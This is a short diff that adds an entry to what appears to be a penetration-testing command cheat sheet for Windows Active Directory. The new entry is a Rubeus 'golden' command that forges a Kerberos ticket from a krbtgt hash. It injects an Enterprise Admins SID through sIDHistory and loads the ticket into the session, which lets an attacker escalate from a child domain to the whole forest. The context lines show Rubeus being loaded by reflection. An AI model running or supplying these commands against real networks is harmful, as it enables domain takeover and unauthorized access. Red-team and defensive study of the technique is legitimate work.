@@ -124,6 +124,13 @@ $assem = [System.Reflection.Assembly]::Load($data)
 [Rubeus.Program]::Main("<rubeus_cmd>".Split())
 ```
 
+## Rubeus - sIDHistory injection
+#plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
+```powershell
+.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<sid_ets_admin> /user:<name> /ptt
+
+```
+
 = ticket : c:\Temp\ticket.kirbi
 = domain_fqdn : MYDC.mydomain.local
 = domain_name : mydomain.local
